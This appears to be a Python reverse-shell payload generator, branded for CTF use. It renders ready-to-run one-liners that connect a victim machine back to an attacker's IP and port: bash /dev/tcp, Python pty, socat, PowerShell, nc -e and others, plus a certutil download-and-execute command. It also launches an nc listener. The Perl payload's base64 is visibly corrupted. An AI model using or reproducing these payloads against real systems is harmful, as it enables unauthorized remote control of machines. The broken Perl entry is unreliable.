#!/usr/bin/env python3

import base64
import socket
import subprocess
import sys
import os
import platform
from typing import List, Dict, Optional, Tuple

# Banner
BANNER = r"""
██████╗ ███████╗██╗   ██╗███████╗██╗  ██╗███████╗██╗     ██╗     ██╗███╗   ██╗ █████╗ ████████╗ ██████╗ ██████╗ 
██╔══██╗██╔════╝██║   ██║██╔════╝██║  ██║██╔════╝██║     ██║     ██║████╗  ██║██╔══██╗╚══██╔══╝██╔═══██╗██╔══██╗
██████╔╝█████╗  ██║   ██║███████╗███████║█████╗  ██║     ██║     ██║██╔██╗ ██║███████║   ██║   ██║   ██║██████╔╝
██╔══██╗██╔══╝  ╚██╗ ██╔╝╚════██║██╔══██║██╔══╝  ██║     ██║     ██║██║╚██╗██║██╔══██║   ██║   ██║   ██║██╔══██╗
██║  ██║███████╗ ╚████╔╝ ███████║██║  ██║███████╗███████╗███████╗██║██║ ╚████║██║  ██║   ██║   ╚██████╔╝██║  ██║
╚═╝  ╚═╝╚══════╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝
                                        Remade in Python for CTF Use
"""

class OsType:
    Linux = "Linux"
    Windows = "Windows"

class PayloadTemplate:
    def __init__(self, template_type: str, content: str):
        self.type = template_type
        self.content = content

    def render(self, ip: str, port: int) -> str:
        if self.type == "static":
            return self.content.replace("{ip}", ip).replace("{port}", str(port))
        elif self.type == "python_base64":
            script = self.content.replace("{ip}", ip).replace("{port}", str(port))
            encoded = base64.b64encode(script.encode()).decode()
            return f'python3 -c "import base64,os,socket,pty; exec(base64.b64decode(\'{encoded}\').decode())"'
        return self.content

class ShellPayload:
    def __init__(self, name: str, lang: str, os_type: str, template: PayloadTemplate):
        self.name = name
        self.lang = lang
        self.os = os_type
        self.template = template

class RenderedPayload:
    def __init__(self, name: str, lang: str, os_type: str, payload: str):
        self.name = name
        self.lang = lang
        self.os = os_type
        self.payload = payload

def get_all_payloads() -> List[ShellPayload]:
    return [
        ShellPayload(
            name="Bash TCP #1",
            lang="bash",
            os_type=OsType.Linux,
            template=PayloadTemplate(
                "static",
                "bash -i >& /dev/tcp/{ip}/{port} 0>&1"
            )
        ),
        ShellPayload(
            name="Bash TCP #4 (Read/Write)",
            lang="bash",
            os_type=OsType.Linux,
            template=PayloadTemplate(
                "static",
                "exec 5<>/dev/tcp/{ip}/{port}; cat <&5 | while read line; do $line 2>&5 >&5; done"
            )
        ),
        ShellPayload(
            name="Python #5 (Base64 Encoded)",
            lang="python",
            os_type=OsType.Linux,
            template=PayloadTemplate(
                "python_base64",
                "import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{ip}',{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/sh')"
            )
        ),
        ShellPayload(
            name="Perl #3 (Base64 Encoded)",
            lang="perl",
            os_type=OsType.Linux,
            template=PayloadTemplate(
                "static",
                "perl -MMIME::Base64 -e 'eval(decode_base64(\"dXNlIFNvY2tldDskaT0ie2lwfSI7JHA9e3BvcnR9O3NvY2tldChTLFBGX0lORVQsU09DS19TVFJFQU0sZ2V0cHJvdG9ieW5hbWUoInRjYXBpZSIpKTtpZihjb25uZWN0KFMsc29ja2FkZF9pbihKcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RJT1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307\"))'"
            )
        ),
        ShellPayload(
            name="Socat #3 (TTY Upgrade)",
            lang="socat",
            os_type=OsType.Linux,
            template=PayloadTemplate(
                "static",
                "socat TCP:{ip}:{port} EXEC:'bash -li',pty,stderr,setsid,sigint,sane"
            )
        ),
        ShellPayload(
            name="Rust (Simple TCP Client)",
            lang="rust",
            os_type=OsType.Linux,
            template=PayloadTemplate(
                "static",
                "RUST_CODE: use std::net::TcpStream; use std::process::Command; if let Ok(stream) = TcpStream::connect(\"{ip}:{port}\") { let _ = Command::new(\"/bin/sh\").stdin(stream.try_clone().unwrap()).stdout(stream.try_clone().unwrap()).stderr(stream).spawn(); }"
            )
        ),
        ShellPayload(
            name="Lua Linux",
            lang="lua",
            os_type=OsType.Linux,
            template=PayloadTemplate(
                "static",
                "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{ip}','{port}');os.execute('/bin/sh -i <&3 >&3 2>&3');\""
            )
        ),
        ShellPayload(
            name="Zsh",
            lang="zsh",
            os_type=OsType.Linux,
            template=PayloadTemplate(
                "static",
                "zmodload zsh/net/tcp && ztcp {ip} {port} && while read line; do $line 2>&3 >&3; done"
            )
        ),
        ShellPayload(
            name="PowerShell #3 (Shortest)",
            lang="powershell",
            os_type=OsType.Windows,
            template=PayloadTemplate(
                "static",
                "$s=New-Object System.Net.Sockets.TCPClient('{ip}',{port});$st=$s.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$st.Read($b,0,$b.Length)) -ne 0){$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sd=[text.encoding]::ASCII.GetBytes($sb2);$st.Write($sd,0,$sd.Length);$st.Flush()};$s.Close()"
            )
        ),
        ShellPayload(
            name="Certutil/PowerShell (Download/Execute)",
            lang="powershell",
            os_type=OsType.Windows,
            template=PayloadTemplate(
                "static",
                "certutil -urlcache -f http://{ip}/rev.ps1 %temp%\\rev.ps1; powershell -exec bypass %temp%\\rev.ps1"
            )
        ),
        ShellPayload(
            name="Netcat Windows",
            lang="cmd",
            os_type=OsType.Windows,
            template=PayloadTemplate(
                "static",
                "nc.exe -e cmd.exe {ip} {port}"
            )
        ),
        ShellPayload(
            name="VBScript",
            lang="vbs",
            os_type=OsType.Windows,
            template=PayloadTemplate(
                "static",
                "VBS_FILE: Set objShell = CreateObject(\"WScript.Shell\") : Set objExec = objShell.Exec(\"cmd.exe /c powershell -enc [BASE64_PAYLOAD]\")"
            )
        ),
        ShellPayload(
            name="C# (Simple)",
            lang="c#",
            os_type=OsType.Windows,
            template=PayloadTemplate(
                "static",
                "C#_CODE: using System.Net.Sockets; using System.Diagnostics; using System.Text; TcpClient client = new TcpClient(\"{ip}\", {port}); NetworkStream stream = client.GetStream(); Process process = new Process(); process.StartInfo.FileName = \"cmd.exe\"; process.StartInfo.UseShellExecute = false; process.StartInfo.RedirectStandardInput = true; process.StartInfo.RedirectStandardOutput = true; process.StartInfo.RedirectStandardError = true; process.Start(); stream.Write(Encoding.ASCII.GetBytes(\"Hello\\n\")); while(true) { if (stream.DataAvailable) { byte[] buffer = new byte[1024]; int bytesRead = stream.Read(buffer, 0, buffer.Length); process.StandardInput.WriteLine(Encoding.ASCII.GetString(buffer, 0, bytesRead)); } else if (process.StandardOutput.Peek() != -1) { stream.Write(Encoding.ASCII.GetBytes(process.StandardOutput.ReadToEnd())); } else if (process.StandardError.Peek() != -1) { stream.Write(Encoding.ASCII.GetBytes(process.StandardError.ReadToEnd())); } }"
            )
        ),
    ]

def get_local_ip() -> str:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"

def get_public_ip() -> str:
    return "0.0.0.0 (External IP Placeholder)"

def get_input(prompt: str) -> str:
    print(f"\033[96m\033[1m{prompt}\033[0m", end='')
    sys.stdout.flush()
    return input().strip()

def validate_ip(ip: str) -> bool:
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False

def validate_port(port: int) -> bool:
    return 1 <= port <= 65535

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def render_payloads(
    all_shells: List[ShellPayload],
    os_type: str,
    language: Optional[str] = None,
    limit: Optional[int] = None,
    ip: str = "",
    port: int = 0
) -> List[RenderedPayload]:
    payloads = []
    for payload in all_shells:
        if payload.os == os_type:
            if language is None or payload.lang.lower() == language.lower():
                rendered_payload = RenderedPayload(
                    name=payload.name,
                    lang=payload.lang,
                    os_type=payload.os,
                    payload=payload.template.render(ip, port)
                )
                payloads.append(rendered_payload)

    if limit:
        payloads = payloads[:limit]

    return payloads

def start_listener(port: int):
    print(f"\n\033[96m\033[1m[*] Starting listener...\033[0m")
    print(f"\033[96m\033[1m[*] Waiting for connection...\n\033[0m")

    try:
        # Try netcat first
        subprocess.run(["nc", "-lvnp", str(port)], check=True)
    except subprocess.CalledProcessError:
        try:
            # Try ncat if nc fails
            subprocess.run(["ncat", "-lvnp", str(port)], check=True)
        except subprocess.CalledProcessError:
            print(f"\033[91m\033[1m[!] Error: Listener failed to start with nc or ncat.\033[0m")
            print(f"\033[93m[*] Command to run manually: nc -lvnp {port}\033[0m")
        except FileNotFoundError:
            print(f"\033[91m\033[1m[!] Error: netcat (nc) or ncat not found. Please install a listener tool.\033[0m")
            print(f"\033[93m[*] Command to run manually: nc -lvnp {port}\033[0m")
    except FileNotFoundError:
        print(f"\033[91m\033[1m[!] Error: netcat (nc) not found. Trying 'ncat'.\033[0m")
        try:
            subprocess.run(["ncat", "-lvnp", str(port)], check=True)
        except subprocess.CalledProcessError:
            print(f"\033[91m\033[1m[!] Error: Listener failed to start with nc or ncat.\033[0m")
            print(f"\033[93m[*] Command to run manually: nc -lvnp {port}\033[0m")
        except FileNotFoundError:
            print(f"\033[91m\033[1m[!] Error: netcat (nc) or ncat not found. Please install a listener tool.\033[0m")
            print(f"\033[93m[*] Command to run manually: nc -lvnp {port}\033[0m")

    print(f"\n\033[93m[*] Listener stopped\033[0m")

def display_banner():
    print(f"\033[96m{BANNER}\033[0m")

def display_config(config: Dict[str, any]):
    print(f"\n\033[1m╔{'═' * 78}╗\033[0m")
    print(f"\033[1m║\033[0m  \033[92m\033[1mCURRENT CONFIGURATION\033[0m  \033[1m{' ' * 55}║\033[0m")
    print(f"\033[1m╠{'═' * 78}╣\033[0m")

    def format_line(name: str, value: str, color: str):
        padding = max(0, 74 - len(name) - len(value))
        full_line = f"\033[1m║\033[0m  \033[96m{name}:\033[0m \033[{color}m{value}\033[0m \033[1m{' ' * padding}║\033[0m"
        print(full_line)

    format_line("Local IP", config['local_ip'], "33")  # Yellow
    format_line("Public IP", config['public_ip'], "33")  # Yellow

    active_ip_display = f"{config['active_ip']} ({config['active_ip_type']})"
    format_line("Active IP", active_ip_display, "32")  # Green
    format_line("Port", str(config['port']), "32")  # Green

    print(f"\033[1m╚{'═' * 78}╝\033[0m")

def display_payloads(payloads: List[RenderedPayload], port: int):
    print(f"\n\033[1m{'=' * 80}\033[0m")
    for idx, payload in enumerate(payloads):
        print(f"\n\033[92m\033[1m[{idx + 1}] {payload.name} ({payload.lang}) (OS: {payload.os})\033[0m")
        print(f"\033[1m{'─' * 80}\033[0m")
        print(f"\033[93m{payload.payload}\033[0m")
        print(f"\033[1m{'─' * 80}\033[0m")
    print(f"\n\033[96m[*] Listener Command: \033[93m\033[1mnc -lvnp {port}\033[0m")

def initial_setup(config: Dict[str, any]):
    while True:
        clear_screen()
        display_banner()
        print(f"\n\033[1m╔{'═' * 80}╗\033[0m")
        print(f"\033[1m║\033[0m  \033[93m\033[1mINITIAL CONFIGURATION\033[0m  \033[1m{' ' * 56}║\033[0m")
        print(f"\033[1m╚{'═' * 80}╝\033[0m")

        print(f"\n\033[96m\033[1m[*] IP ADDRESS SELECTION\033[0m")
        print(f"\033[1m{'─' * 80}\033[0m")
        print(f"  \033[92m[1]\033[0m Use Local IP:  \033[93m{config['local_ip']}\033[0m")
        print(f"  \033[92m[2]\033[0m Use Public IP: \033[93m{config['public_ip']}\033[0m")
        print(f"  \033[92m[3]\033[0m Enter Custom IP")
        print(f"\033[1m{'─' * 80}\033[0m")

        choice = get_input("Select IP option (1-3): ")

        if choice == "1":
            config['active_ip'] = config['local_ip']
            config['active_ip_type'] = "Local"
            print(f"\033[92m[+] IP set to Local: {config['active_ip']}\033[0m")
            break
        elif choice == "2":
            config['active_ip'] = config['public_ip']
            config['active_ip_type'] = "Public"
            print(f"\033[92m[+] IP set to Public: {config['active_ip']}\033[0m")
            break
        elif choice == "3":
            custom_ip = get_input("Enter custom IP address: ")
            if validate_ip(custom_ip):
                config['active_ip'] = custom_ip
                config['active_ip_type'] = "Custom"
                print(f"\033[92m[+] IP set to Custom: {config['active_ip']}\033[0m")
                break
            else:
                print(f"\033[91m[!] Invalid IP address format. Try again.\033[0m")
                get_input("Press Enter to continue...")
        else:
            print(f"\033[91m[!] Invalid option. Please select 1, 2, or 3.\033[0m")
            get_input("Press Enter to continue...")

    while True:
        print(f"\n\033[96m\033[1m[*] PORT SELECTION\033[0m")
        print(f"\033[1m{'─' * 80}\033[0m")
        print(f"  \033[92m[1]\033[0m Use port 4444 (default)")
        print(f"  \033[92m[2]\033[0m Use port 1337")
        print(f"  \033[92m[3]\033[0m Use port 9001")
        print(f"  \033[92m[4]\033[0m Enter custom port")
        print(f"\033[1m{'─' * 80}\033[0m")

        choice = get_input("Select port option (1-4): ")

        if choice == "1":
            config['port'] = 4444
            print(f"\033[92m[+] Port set to: {config['port']}\033[0m")
            break
        elif choice == "2":
            config['port'] = 1337
            print(f"\033[92m[+] Port set to: {config['port']}\033[0m")
            break
        elif choice == "3":
            config['port'] = 9001
            print(f"\033[92m[+] Port set to: {config['port']}\033[0m")
            break
        elif choice == "4":
            custom_port_input = get_input("Enter custom port (1-65535): ")
            try:
                port_num = int(custom_port_input)
                if validate_port(port_num):
                    config['port'] = port_num
                    print(f"\033[92m[+] Port set to: {config['port']}\033[0m")
                    break
                else:
                    print(f"\033[91m[!] Port must be between 1 and 65535. Try again.\033[0m")
            except ValueError:
                print(f"\033[91m[!] Invalid port number. Try again.\033[0m")
        else:
            print(f"\033[91m[!] Invalid option. Please select 1, 2, 3, or 4.\033[0m")

    print(f"\n\033[92m\033[1m[✓] Configuration complete!\033[0m")
    get_input("\nPress Enter to continue...")

def os_submenu(config: Dict[str, any], os_type: str, all_shells: List[ShellPayload]):
    os_name = os_type
    available_languages = list(set(payload.lang for payload in all_shells if payload.os == os_type))

    while True:
        clear_screen()
        display_banner()
        display_config(config)

        print(f"\n\033[1m╔{'═' * 80}╗\033[0m")
        print(f"\033[1m║\033[0m  \033[96m\033[1m{os_name.upper()} SHELLS MENU\033[0m  \033[1m{' ' * 61}║\033[0m")
        print(f"\033[1m╚{'═' * 80}╝\033[0m")

        print(f"  \033[92m[1]\033[0m Show All Shells (Top 5)")
        print(f"  \033[92m[2]\033[0m Browse by Language")
        print(f"  \033[92m[3]\033[0m Show All Available Shells")
        print(f"  \033[92m[4]\033[0m Generate Shells & Start Listener")
        print(f"\n  \033[96m\033[1mQuick Access Languages:\033[0m")

        if os_type == OsType.Linux:
            quick_access = [("b", "bash"), ("p", "python"), ("z", "zsh"), ("n", "socat")]
        else:  # Windows
            quick_access = [("p", "powershell"), ("c", "cmd"), ("v", "vbs"), ("h", "c#")]

        for key, lang in quick_access:
            print(f"  \033[92m[{key}]\033[0m {lang.capitalize()} menu")

        print(f"\n  \033[92m[5]\033[0m Back to Main Menu")
        print(f"\033[1m{'─' * 80}\033[0m")

        choice = get_input("Select option: ")

        if choice == "1":
            payloads = render_payloads(all_shells, os_type, None, 5, config['active_ip'], config['port'])
            display_payloads(payloads, config['port'])
            get_input("\nPress Enter to continue...")
        elif choice == "2":
            while True:
                clear_screen()
                display_banner()
                display_config(config)
                print(f"\n\033[1m╔{'═' * 80}╗\033[0m")
                print(f"\033[1m║\033[0m  \033[96m\033[1mAVAILABLE LANGUAGES\033[0m  \033[1m{' ' * 58}║\033[0m")
                print(f"\033[1m╚{'═' * 80}╝\033[0m")

                sorted_langs = sorted(available_languages)

                for idx, lang in enumerate(sorted_langs):
                    print(f"  \033[92m[{idx + 1}]\033[0m {lang.capitalize()}")

                print(f"\033[1m{'─' * 80}\033[0m")
                print(f"  \033[92m[0]\033[0m Back to {os_name} Menu")
                print(f"\033[1m{'─' * 80}\033[0m")

                lang_choice = get_input("Select language number: ")

                if lang_choice == "0":
                    break
                try:
                    idx = int(lang_choice) - 1
                    if 0 <= idx < len(sorted_langs):
                        selected_lang = sorted_langs[idx]
                        language_submenu(config, os_type, selected_lang, all_shells)
                    else:
                        print(f"\033[91m[!] Invalid selection\033[0m")
                        get_input("\nPress Enter to continue...")
                except ValueError:
                    print(f"\033[91m[!] Invalid selection\033[0m")
                    get_input("\nPress Enter to continue...")
        elif choice == "3":
            payloads = render_payloads(all_shells, os_type, None, None, config['active_ip'], config['port'])
            display_payloads(payloads, config['port'])
            get_input("\nPress Enter to continue...")
        elif choice == "4":
            payloads = render_payloads(all_shells, os_type, None, 5, config['active_ip'], config['port'])
            display_payloads(payloads, config['port'])
            confirm = get_input("\nStart listener now? (y/n): ")
            if confirm.lower() == "y":
                start_listener(config['port'])
            get_input("\nPress Enter to continue...")
        elif choice == "5":
            break
        elif choice in [key for key, _ in quick_access]:
            # Find the language for the chosen key
            lang = next(lang for key, lang in quick_access if key == choice)
            language_submenu(config, os_type, lang, all_shells)
        else:
            print(f"\033[91m[!] Invalid option\033[0m")
            get_input("\nPress Enter to continue...")

def language_submenu(config: Dict[str, any], os_type: str, language: str, all_shells: List[ShellPayload]):
    while True:
        clear_screen()
        display_banner()
        display_config(config)

        print(f"\n\033[1m╔{'═' * 80}╗\033[0m")
        print(f"\033[1m║\033[0m  \033[96m\033[1m{language.upper()} SHELLS - {os_type.upper()}\033[0m  \033[1m{' ' * 50}║\033[0m")
        print(f"\033[1m╚{'═' * 80}╝\033[0m")

        print(f"  \033[92m[1]\033[0m Show All {language.capitalize()} Shells")
        print(f"  \033[92m[2]\033[0m Show Top 5 {language.capitalize()} Shells")
        print(f"  \033[92m[3]\033[0m Generate & Start Listener")
        print(f"  \033[92m[4]\033[0m Back to {os_type} Menu")
        print(f"\033[1m{'─' * 80}\033[0m")

        choice = get_input("Select option: ")

        if choice == "1":
            payloads = render_payloads(all_shells, os_type, language, None, config['active_ip'], config['port'])
            display_payloads(payloads, config['port'])
            get_input("\nPress Enter to continue...")
        elif choice == "2":
            payloads = render_payloads(all_shells, os_type, language, 5, config['active_ip'], config['port'])
            display_payloads(payloads, config['port'])
            get_input("\nPress Enter to continue...")
        elif choice == "3":
            payloads = render_payloads(all_shells, os_type, language, None, config['active_ip'], config['port'])
            display_payloads(payloads, config['port'])

            confirm = get_input("\nStart listener now? (y/n): ")
            if confirm.lower() == "y":
                start_listener(config['port'])
            get_input("\nPress Enter to continue...")
        elif choice == "4":
            break
        else:
            print(f"\033[91m[!] Invalid option\033[0m")
            get_input("\nPress Enter to continue...")

def main():
    local_ip = get_local_ip()
    public_ip = get_public_ip()

    config = {
        'active_ip': local_ip,
        'active_ip_type': "Local",
        'local_ip': local_ip,
        'public_ip': public_ip,
        'port': 4444,
    }

    all_shells = get_all_payloads()

    clear_screen()
    display_banner()
    print(f"\n\033[91m\033[1m╔{'═' * 80}╗\033[0m")
    print(f"\033[91m\033[1m║\033[0m  \033[93m\033[1m⚠️  LEGAL WARNING ⚠️\033[0m  \033[91m\033[1m{' ' * 60}║\033[0m")
    print(f"\033[91m\033[1m╚{'═' * 80}╝\033[0m")
    print(f"\033[93mThis tool generates REAL reverse shell payloads. Use it responsibly and legally for CTF and authorized testing ONLY.\033[0m")
    print(f"\033[91m\033[1mUnauthorized access to computer systems is ILLEGAL.\033[0m")
    print(f"\033[1m{'─' * 80}\033[0m")

    confirm = get_input("\nI understand and will use this tool responsibly (yes/no): ")
    if confirm.lower() != "yes":
        print(f"\n\033[93m[*] Exiting. Use responsibly!\033[0m")
        sys.exit(0)

    initial_setup(config)

    while True:
        clear_screen()
        display_banner()
        display_config(config)

        print(f"\n\033[1m╔{'═' * 80}╗\033[0m")
        print(f"\033[1m║\033[0m  \033[96m\033[1mMAIN MENU\033[0m  \033[1m{' ' * 68}║\033[0m")
        print(f"\033[1m╚{'═' * 80}╝\033[0m")

        print(f"  \033[92m[1]\033[0m Generate Linux Shells")
        print(f"  \033[92m[2]\033[0m Generate Windows Shells")
        print(f"  \033[92m[3]\033[0m Reconfigure IP/Port")
        print(f"  \033[92m[4]\033[0m Start Listener (nc/ncat)")
        print(f"  \033[92m[5]\033[0m Exit")
        print(f"\033[1m{'─' * 80}\033[0m")

        choice = get_input("Select option: ")

        if choice == "1":
            os_submenu(config, OsType.Linux, all_shells)
        elif choice == "2":
            os_submenu(config, OsType.Windows, all_shells)
        elif choice == "3":
            get_input("\nReconfiguration: Press Enter to re-run initial setup...")
            initial_setup(config)
        elif choice == "4":
            start_listener(config['port'])
            get_input("\nPress Enter to continue...")
        elif choice == "5":
            print(f"\n\033[92m[*] Exiting... Stay safe and legal!\033[0m")
            break
        else:
            print(f"\033[91m[!] Invalid option\033[0m")
            get_input("\nPress Enter to continue...")

    print(f"\n\033[91m\033[1m[i] cya later .\033[0m")

if __name__ == "__main__":
    main()
